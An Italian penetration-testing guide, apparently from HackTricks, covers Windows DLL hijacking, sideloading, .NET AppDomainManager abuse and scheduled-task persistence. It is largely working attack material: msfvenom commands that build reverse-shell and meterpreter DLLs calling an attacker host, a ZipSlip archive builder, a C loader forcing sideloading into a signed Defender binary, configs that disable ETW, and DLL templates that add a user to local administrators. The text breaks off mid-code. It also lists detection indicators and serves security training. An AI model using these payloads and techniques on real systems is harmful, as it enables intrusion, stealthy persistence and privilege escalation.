# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informazioni di base

Il DLL Hijacking consiste nel manipolare un'applicazione attendibile affinché carichi una DLL malevola. Il termine comprende diverse tattiche, come **DLL Spoofing, Injection e Side-Loading**. Viene utilizzato principalmente per eseguire codice e ottenere persistenza e, meno frequentemente, per l'escalation dei privilegi. Anche se qui l'attenzione è rivolta all'escalation, il metodo di hijacking rimane lo stesso a prescindere dall'obiettivo.

### Tecniche comuni

Per il DLL hijacking si utilizzano diversi metodi, ciascuno con un'efficacia che dipende dalla strategia di caricamento delle DLL dell'applicazione:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: sostituzione di una DLL autentica con una malevola, eventualmente usando DLL Proxying per preservare le funzionalità della DLL originale.
2. **DLL Search Order Hijacking**: inserimento della DLL malevola in un percorso di ricerca precedente a quello della DLL legittima, sfruttando il pattern di ricerca dell'applicazione.
3. **Phantom DLL Hijacking**: creazione di una DLL malevola da caricare da parte di un'applicazione che la considera una DLL richiesta ma inesistente.
4. **DLL Redirection**: modifica dei parametri di ricerca come `%PATH%` o dei file `.exe.manifest` / `.exe.local` per indirizzare l'applicazione alla DLL malevola.
5. **WinSxS DLL Replacement**: sostituzione della DLL legittima con una controparte malevola nella directory WinSxS, un metodo spesso associato al DLL side-loading.
6. **Relative Path DLL Hijacking**: inserimento della DLL malevola in una directory controllata dall'utente insieme all'applicazione copiata, in modo simile alle tecniche di Binary Proxy Execution.

Un'applicazione può anche implementare un **proprio loader di DLL**. Un processo privilegiato può enumerare una directory figlia, come `Libraries` o `Plugins`, e passare una DLL selezionata a un helper, indipendentemente dal normale ordine di ricerca delle DLL di Windows. Se un altro account può creare file proprio in quella directory, consideratelo un indizio da approfondire: verificate l'identità del processo, l'ACL effettiva della directory, la regola di selezione dei file e la possibilità di raggiungere un'operazione di caricamento. Il fatto che una directory scrivibile si trovi accanto a un eseguibile non dimostra che il processo carichi DLL da lì.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### Import grafting di PE dopo l'installazione

Il side-loading classico lascia invariato il PE attendibile e sfrutta la risoluzione dei nomi delle DLL. L'**Import grafting**, invece, modifica un PE già caricato dal programma attendibile. L'attaccante aggiunge un descrittore di importazione e le relative voci di lookup/IAT per una DLL sotto il suo controllo. Quando Windows risolve ricorsivamente questa dipendenza, mappa la DLL aggiunta ed esegue il suo codice di inizializzazione all'interno del processo altrimenti legittimo. Si tratta di una modifica del PE su disco, non della stessa operazione che consiste nel sostituire un puntatore a una funzione IAT attiva con un hook a runtime.<sup>[[26]](#references)[[27]](#references)</sup>

Il PE modificato può essere una DLL intermedia del vendor, anziché l'eseguibile avviato dall'utente o da Utilità di pianificazione. Una catena riutilizzabile è:<sup>[[27]](#references)</sup>

1. Copiare l'eseguibile legittimo e le sue dipendenze in una directory controllata dall'attaccante.
2. Modificare le strutture di importazione di una dipendenza affinché facciano riferimento alla DLL malevola, mantenendo le esportazioni attese e il normale comportamento della dipendenza.
3. Configurare un autorun o un'attività pianificata per avviare l'eseguibile legittimo. Il loader mappa la dipendenza alterata e poi la DLL appena importata. Consultate [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks) per enumerare le attività.
4. Evitare di inserire operazioni onerose in `DllMain`; il loader osservato ha creato un thread worker e vi ha proseguito la decrittazione per fasi.

Questo è diverso da una compromissione della supply chain lato vendor, perché il pacchetto del vendor è pulito e la modifica degli import avviene dopo l'installazione. Esaminate ogni modulo nella directory di staging, non solo l'host EXE: confrontate le liste di importazione e gli hash delle dipendenze con un'installazione nota come valida, verificate le firme e analizzate i binari del vendor avviati da posizioni scrivibili inaspettate, come `C:\ProgramData`. Un'attività pianificata che punta a una copia di un crash reporter o di un updater in una directory di questo tipo è un punto di partenza particolarmente utile.<sup>[[27]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + assembly dell'attaccante)

Il DLL sideloading classico non è l'unico modo per far caricare codice dell'attaccante a un processo attendibile **.NET Framework**. Se l'eseguibile di destinazione è un'applicazione **managed**, il CLR consulta anche un **file di configurazione dell'applicazione** che prende il nome dall'eseguibile (per esempio `Setup.exe.config`). Questo file può definire un **AppDomainManager** personalizzato. Se la configurazione punta a un assembly controllato dall'attaccante e collocato accanto all'EXE, il CLR lo carica **prima del normale percorso di esecuzione dell'applicazione** e lo esegue all'interno del processo attendibile.<sup>[[24]](#references)</sup>

Secondo lo schema di configurazione di .NET Framework di Microsoft, devono essere presenti sia `<appDomainManagerAssembly>` sia `<appDomainManagerType` affinché venga utilizzato il manager personalizzato.<sup>[[16]](#references)[[17]](#references)</sup>

Configurazione minima:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Gestore minimale:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Note pratiche:
- Questa tecnica è specifica di **.NET Framework**. Dipende dall’analisi della configurazione del CLR, non dall’ordine di ricerca delle DLL di Win32.
- L’host deve essere effettivamente un **EXE managed**. Verifica rapida: `sigcheck -m target.exe`, `corflags target.exe` oppure controlla la presenza del **CLR Runtime Header** nei metadati PE.
- Il nome del file di configurazione deve corrispondere esattamente al nome dell’eseguibile (`<binary>.config`) e di solito si trova **accanto all’EXE**.
- È utile con **binari Microsoft/vendor firmati**, perché l’EXE attendibile rimane intatto mentre l’assembly managed malevolo viene eseguito in-process.
- Se hai già una directory di installazione/aggiornamento scrivibile, l’hijacking di AppDomainManager può essere usato come **prima fase**, seguito da classico DLL sideloading o reflective loading per le fasi successive.

### AppDomainManager come downloader + bootstrap di un’attività pianificata

Un modello pratico di intrusione consiste nell’affiancare all’EXE managed attendibile sia un `*.config` malevolo sia una DLL AppDomainManager malevola che funge solo da **piccolo bootstrapper**:<sup>[[25]](#references)</sup>

1. L’utente avvia un installer o updater .NET firmato da una posizione plausibile, come `%USERPROFILE%\Downloads`.
2. Il file di configurazione adiacente fa sì che il CLR carichi l’assembly dell’attaccante **prima** che inizi la logica dell’applicazione legittima.
3. Il manager malevolo applica un **path gate** (ad esempio, continua solo se l’EXE host è in esecuzione da `Downloads` e consente l’esecuzione della seconda fase solo da `%LOCALAPPDATA%`).
4. Se il controllo ha esito positivo, scarica il payload reale in un percorso scrivibile dall’utente, come `%LOCALAPPDATA%\PerfWatson2.exe`, e installa la persistenza con un’attività pianificata.

Perché questa variante è importante:
- L’EXE host firmato rimane invariato, quindi un triage che calcola l’hash solo del binario principale potrebbe non rilevare la compromissione.
- Le semplici tecniche di **anti-analysis basate sul percorso** sono comuni: spostare la triade ZIP/EXE/DLL sul Desktop, in Temp o in un percorso sandbox può interrompere intenzionalmente la catena.
- La DLL AppDomainManager della prima fase può rimanere piccola e poco rumorosa, mentre l’impianto reale viene scaricato in seguito.

Esempio minimo di persistenza spesso usato con questo modello:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Note:
- ` /rl highest` significa **il livello più alto disponibile** per quell'utente/sessione; da solo non garantisce un'escalation a SYSTEM.
- Questa tecnica è spesso classificata meglio come **esecuzione/persistenza tramite abuso della configurazione .NET** piuttosto che come classico hijacking dell'ordine di ricerca per DLL mancanti, anche se gli operatori spesso concatenano entrambe le tecniche.

Indicatori per il rilevamento:
- Eseguibili .NET firmati avviati da **percorsi di estrazione ZIP**, `Downloads`, `%TEMP%` o altre cartelle scrivibili dall'utente, con un file `<exe>.config` **nella stessa directory**.
- Nuove attività pianificate la cui azione punta a `%LOCALAPPDATA%`, `%APPDATA%` o `Downloads` e i cui nomi imitano gli updater di browser o vendor.
- Processi bootstrap gestiti di breve durata che scaricano immediatamente un altro EXE e poi avviano `schtasks.exe`.
- Campioni che terminano subito se il percorso dell'eseguibile non corrisponde a una directory prevista nel profilo utente.

### Hijacking di un'attività pianificata esistente per riavviare la catena di sideload

Per la persistenza, non limitarti a cercare la **creazione di una nuova attività**. Alcuni gruppi di intrusione aspettano che un programma di installazione legittimo crei una **normale attività di aggiornamento**, per poi **riscrivere l'azione dell'attività**, mantenendo familiari ai difensori il nome, l'autore e il trigger esistenti.

Flusso di lavoro riutilizzabile:
1. Installa/avvia il software legittimo e identifica l'attività che crea normalmente.
2. Esporta l'XML dell'attività e annota i valori correnti di `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Sostituisci solo l'azione, in modo che l'attività avvii il tuo **EXE host attendibile** da una directory di staging scrivibile dall'utente, che poi esegue il side-load o carica il payload reale tramite AppDomain.
4. Registra nuovamente lo stesso nome di attività invece di creare un nuovo artefatto di persistenza evidente.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Perché è più stealth:
- Il nome dell'attività può sembrare legittimo (ad esempio, un updater di un vendor).
- La avvia il **servizio Task Scheduler**, quindi la convalida del processo padre/antenati spesso rileva la catena di pianificazione prevista invece di `explorer.exe`.
- I team DFIR che cercano solo **nuovi nomi di attività** potrebbero non rilevare un'attività già registrata, la cui azione ora punta a `%LOCALAPPDATA%`, `%APPDATA%` o a un altro percorso controllato dall'attaccante.

Punti di ricerca rapidi:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Confronta gli XML in `C:\Windows\System32\Tasks\*` e i metadati in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` con una baseline.
- Genera un alert quando un'**attività updater dal nome simile a quello di un vendor** viene eseguita da **directory scrivibili dall'utente** o avvia un EXE .NET con un file `*.config` nella stessa directory.

> [!TIP]
> Per una catena dettagliata che combina HTML staging, configurazioni AES-CTR e impianti .NET con il DLL sideloading, consulta il workflow seguente.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Individuare le DLL mancanti

Il modo più comune per trovare DLL mancanti in un sistema consiste nell'eseguire [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) di sysinternals, **impostando** i **seguenti 2 filtri**:

![Tecniche comuni - Individuare le DLL mancanti: il modo più comune per trovare DLL mancanti in un sistema consiste nell'eseguire procmon di sysinternals, impostando i seguenti 2 filtri](<../../../images/image (961).png>)

![Tecniche comuni - Individuare le DLL mancanti: il modo più comune per trovare DLL mancanti in un sistema consiste nell'eseguire procmon di sysinternals, impostando i seguenti 2 filtri](<../../../images/image (230).png>)

e mostrando solo l'**attività del file system**:

![Tecniche comuni - Individuare le DLL mancanti: e mostrare solo l'attività del file system](<../../../images/image (153).png>)

Se cerchi **DLL mancanti in generale**, lascia Procmon in esecuzione per alcuni **secondi**.\
Se cerchi una **DLL mancante all'interno di un eseguibile specifico**, imposta un altro filtro, ad esempio **"Process Name" "contains" `<exec name>`**, esegui il programma e interrompi l'acquisizione degli eventi.<sup>[[9]](#references)</sup>

## Sfruttare le DLL mancanti

Per elevare i privilegi, cerca una **DLL che un processo privilegiato tenta di caricare** da una posizione in cui puoi scrivere. Questo può accadere se controlli una directory cercata prima di quella contenente la DLL legittima o se la DLL richiesta non esiste e puoi scrivere in una delle directory cercate.

### Ordine di ricerca delle DLL

**Nella** [**documentazione Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puoi trovare informazioni dettagliate sul caricamento delle DLL.**

Le **applicazioni Windows** cercano le DLL seguendo un insieme di **percorsi di ricerca predefiniti**, secondo una sequenza specifica. Il DLL hijacking si verifica quando una DLL dannosa viene collocata strategicamente in una di queste directory, in modo da essere caricata prima della DLL autentica. Per prevenirlo, assicurati che l'applicazione utilizzi percorsi assoluti per fare riferimento alle DLL necessarie.

Di seguito è riportato l'**ordine di ricerca delle DLL nei sistemi a 32 bit**:

1. La directory da cui è stata caricata l'applicazione.
2. La directory di sistema. Usa la funzione [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) per ottenere il percorso di questa directory.(_C:\Windows\System32_)
3. La directory di sistema a 16 bit. Non esiste una funzione per ottenere il percorso di questa directory, ma viene comunque cercata. (_C:\Windows\System_)
4. La directory di Windows. Usa la funzione [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) per ottenere il percorso di questa directory.
   1. (_C:\Windows_)
5. La directory corrente.
6. Le directory elencate nella variabile d'ambiente PATH. Tieni presente che non include il percorso specifico dell'applicazione indicato dalla chiave di registro **App Paths**. La chiave **App Paths** non viene usata per calcolare il percorso di ricerca delle DLL.

Questo è l'ordine di ricerca **predefinito** con **SafeDllSearchMode** abilitato. Se è disabilitato, la directory corrente sale al secondo posto. Per disabilitare questa funzionalità, crea il valore di registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e impostalo a 0 (il valore predefinito è abilitato).

Se la funzione [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) viene chiamata con **LOAD_WITH_ALTERED_SEARCH_PATH**, la ricerca inizia nella directory del modulo eseguibile che **LoadLibraryEx** sta caricando.

Infine, una DLL può essere caricata usando il percorso assoluto invece del nome. In tal caso, Windows cerca la DLL stessa solo in quel percorso; le dipendenze richieste per nome seguono comunque l'ordine di ricerca applicabile.

Esistono altri modi per modificare l'ordine di ricerca, ma non li spiegherò qui.

### Concatenare una scrittura arbitraria di file a un hijack di DLL mancante

**Tecnica correlata:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Usa i filtri di **ProcMon** (`Process Name` = EXE target, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) per raccogliere i nomi delle DLL che il processo cerca senza riuscire a trovarle.<sup>[[14]](#references)</sup>
2. Se il binario viene eseguito secondo una **pianificazione o come servizio**, depositare una DLL con uno di quei nomi nella **directory dell'applicazione** (voce #1 dell'ordine di ricerca) farà sì che venga caricata alla successiva esecuzione. In un caso relativo a uno scanner .NET, il processo cercava `hostfxr.dll` in `C:\samples\app\` prima di caricare la copia autentica da `C:\Program Files\dotnet\fxr\...`.
3. Crea una DLL payload (ad esempio, una reverse shell) con qualsiasi export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Se la tua primitiva è una scrittura arbitraria di file in stile **ZipSlip**, crea uno ZIP con una voce che esce dalla directory di estrazione, in modo che la DLL finisca nella directory dell'app:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Consegna l'archivio alla inbox/share monitorata; quando l'attività pianificata riavvia il processo, questo carica la DLL malevola ed esegue il tuo codice come account del servizio.

### Forzare il sideloading tramite RTL_USER_PROCESS_PARAMETERS.DllPath

Un metodo avanzato per influenzare in modo deterministico il percorso di ricerca delle DLL di un processo appena creato consiste nell'impostare il campo DllPath in RTL_USER_PROCESS_PARAMETERS quando si crea il processo con le API native di ntdll. Specificando qui una directory controllata dall'attaccante, è possibile forzare un processo target che risolve una DLL importata tramite nome (senza percorso assoluto e senza usare i flag di caricamento sicuro) a caricare una DLL malevola da quella directory.

Idea chiave
- Crea i parametri del processo con RtlCreateProcessParametersEx e specifica un DllPath personalizzato che punti alla tua cartella controllata (ad es., la directory in cui si trova il tuo dropper/unpacker).
- Crea il processo con RtlCreateUserProcess. Quando il binario target risolve una DLL tramite nome, il loader consulterà il DllPath specificato durante la risoluzione, consentendo un sideloading affidabile anche quando la DLL malevola non si trova nella stessa directory dell'EXE target.

Note/limitazioni
- Questo influisce sul processo figlio in fase di creazione; è diverso da SetDllDirectory, che influisce solo sul processo corrente.
- Il target deve importare una DLL o caricarla con LoadLibrary tramite nome (senza percorso assoluto e senza usare LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs e i percorsi assoluti hardcoded non possono essere dirottati. Le esportazioni inoltrate e SxS possono modificare la precedenza.

Esempio C minimale (ntdll, stringhe wide, gestione semplificata degli errori):

<details>
<summary>Esempio C completo: forzare il sideloading di DLL tramite RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Esempio di utilizzo operativo
- Posiziona una xmllite.dll malevola (che esporti le funzioni richieste o faccia da proxy per quella reale) nella directory DllPath.
- Avvia un binario firmato noto per cercare xmllite.dll per nome usando la tecnica descritta sopra. Il loader risolve l'importazione tramite il DllPath fornito e carica lateralmente la tua DLL.

Questa tecnica è stata osservata in-the-wild per creare catene di sideloading in più fasi: un launcher iniziale rilascia una DLL helper, che poi avvia un binario firmato da Microsoft e vulnerabile all'hijacking, con un DllPath personalizzato per forzare il caricamento della DLL dell'attaccante da una directory di staging.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking tramite `.exe.config`

Per i target **.NET Framework**, è possibile eseguire sideloading **prima di `Main()`** senza applicare patch alla memoria, abusando del file **`.exe.config`** adiacente all'applicazione. Invece di affidarsi solo all'ordine di ricerca delle DLL Win32, l'attaccante posiziona un EXE .NET legittimo accanto a un file di configurazione malevolo e a uno o più assembly controllati dall'attaccante.

Come funziona la catena:<sup>[[15]](#references)[[22]](#references)</sup>
1. L'EXE host viene avviato e il **CLR legge `<exe>.config`**.
2. La configurazione imposta **`<appDomainManagerAssembly>`** e **`<appDomainManagerType>`**, in modo che il runtime istanzi un `AppDomainManager` controllato dall'attaccante.
3. Il manager malevolo ottiene **l'esecuzione prima di `Main()`** all'interno del processo host attendibile.
4. La stessa configurazione può forzare il CLR a risolvere prima gli assembly locali (ad esempio `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) e può indebolire la convalida e la telemetria del runtime senza applicare patch inline.

Schema tipico delle campagne (la struttura esatta può variare in base alla direttiva e alla versione del CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Perché è utile:
- **`<probing privatePath="."/>`** mantiene la risoluzione degli assembly nella directory dell'applicazione, trasformando la cartella in una superficie prevedibile per il sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** spostano l'esecuzione nel codice dell'attaccante durante l'inizializzazione del CLR, prima che venga eseguita la logica dell'app legittima.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** può consentire a un'app full-trust di caricare assembly senza firma o manomessi, evitando un errore di convalida dello strong name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** evita i reindirizzamenti della publisher policy verso assembly più recenti.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** rende più deterministica la selezione del runtime.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** è particolarmente interessante perché il **CLR disabilita la propria visibilità ETW** tramite la configurazione, invece di richiedere all'implant di patchare `EtwEventWrite` in memoria.

Schema operativo osservato in campagne recenti:
- Fase 1: rilascia `setup.exe`, `setup.exe.config` e assembly locali.
- Fase 2: li copia in una credibile cartella di **aggiornamento in AppData**, rinomina l'host con un nome come `update.exe` e lo riavvia tramite un'**attività pianificata**.
- Fase 3: verifica il contesto di esecuzione (ad esempio, il processo padre previsto, `svchost.exe` avviato da Task Scheduler) prima di caricare la DLL/export finale del RAT.

Spunti per la ricerca:
- **Eseguibili .NET** firmati o comunque legittimi che vengono eseguiti con file **`.config`** adiacenti sospetti in percorsi scrivibili dall'utente.
- File `.config` contenenti **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** o **`etwEnable enabled="false"`**.
- Attività pianificate che riavviano binari di aggiornamento rinominati da **`%LOCALAPPDATA%`** o da directory specifiche dell'app, come `\bin\update\`.
- Catene di processi padre/figlio in cui un'attività pianificata avvia un host .NET attendibile che carica immediatamente assembly non del vendor dalla propria directory.

#### Eccezioni all'ordine di ricerca delle DLL secondo la documentazione Windows

Nella documentazione Windows sono indicate alcune eccezioni all'ordine di ricerca standard delle DLL:

- Quando viene rilevata una **DLL con lo stesso nome di una già caricata in memoria**, il sistema ignora la ricerca consueta. Controlla invece la presenza di reindirizzamenti e di un manifest, quindi usa la DLL già in memoria come scelta predefinita. **In questo scenario, il sistema non cerca la DLL**.
- Se la DLL è riconosciuta come **DLL nota** per la versione corrente di Windows, il sistema utilizza la propria versione della DLL nota e tutte le relative DLL dipendenti, **senza eseguire la ricerca**. La chiave del registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene l'elenco di queste DLL note.
- Se una **DLL ha dipendenze**, la ricerca di queste DLL dipendenti viene eseguita come se fossero indicate solo tramite i rispettivi **nomi di modulo**, indipendentemente dal fatto che la DLL iniziale sia stata individuata tramite un percorso completo.

### Escalation dei privilegi

**Requisiti**:

- Individuare un processo che opera o opererà con **privilegi diversi** (movimento orizzontale o laterale) e a cui **manca una DLL**.
- Assicurarsi di avere **accesso in scrittura** a una qualsiasi **directory** in cui verrà **cercata la DLL**. Potrebbe trattarsi della directory dell'eseguibile o di una directory inclusa nel percorso di sistema.

Questi prerequisiti sono rari per impostazione predefinita: gli eseguibili con privilegi elevati di solito non hanno dipendenze DLL mancanti e gli utenti standard normalmente non possono scrivere nelle directory dei percorsi di ricerca di sistema. Gli ambienti configurati in modo errato possono comunque presentare entrambe le condizioni.\
Se i requisiti sono soddisfatti, controlla il progetto [UACME](https://github.com/hfiref0x/UACME). Sebbene il suo obiettivo principale sia il bypass di UAC, contiene PoC di DLL hijacking per versioni specifiche di Windows, spesso adattabili alla directory scrivibile individuata.

Nota che puoi **controllare i tuoi permessi in una cartella** con:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

E **controlla i permessi di tutte le cartelle all'interno di PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Puoi anche controllare le importazioni di un eseguibile e le esportazioni di una DLL con:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Per una guida completa su come **sfruttare DLL Hijacking per aumentare i privilegi** disponendo dei permessi di scrittura su una **cartella System Path**, consulta:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Strumenti automatizzati

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)verifica se hai i permessi di scrittura su una qualsiasi cartella all'interno del system PATH.\
Altri strumenti automatizzati interessanti per individuare questa vulnerabilità sono le funzioni di **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._

### Esempio

Se individui uno scenario sfruttabile, uno degli aspetti più importanti per riuscire a sfruttarlo è **creare una dll che esporti almeno tutte le funzioni che l'eseguibile importerà da essa**. In ogni caso, tieni presente che DLL Hijacking è utile per [passare dal livello di integrità Medium a High **(bypassando UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o da[ **High Integrity a SYSTEM**](../index.html#from-high-integrity-to-system)**.** Puoi trovare un esempio di **come creare una dll valida** in questo studio su DLL hijacking, incentrato sull'esecuzione: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Inoltre, nella **sezione successiva** trovi alcuni **codici dll di base** che possono essere utili come **template** o per creare una **dll con funzioni esportate non richieste**.

## **Creazione e compilazione di DLL**

### **DLL Proxifying**

In sostanza, una **DLL proxy** è una DLL in grado di **eseguire il tuo codice malevolo quando viene caricata**, ma anche di **esporre** le funzioni e **comportarsi** come **previsto**, inoltrando tutte le chiamate alla libreria reale.

Con lo strumento [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puoi **indicare un eseguibile e selezionare la libreria** per cui creare un proxy, quindi **generare una dll proxificata**; in alternativa puoi **indicare la DLL** e **generare una dll proxificata**.

### **Meterpreter**

**Ottieni una rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Ottieni un meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Crea un utente (x86, non ho trovato una versione x64):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Il tuo

In molti casi, la DLL compilata deve **esportare tutte le funzioni importate dal processo vittima**. Se manca un'esportazione necessaria, il binario non può risolverla e l'exploit fallisce.

<details>
<summary>Template DLL C (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
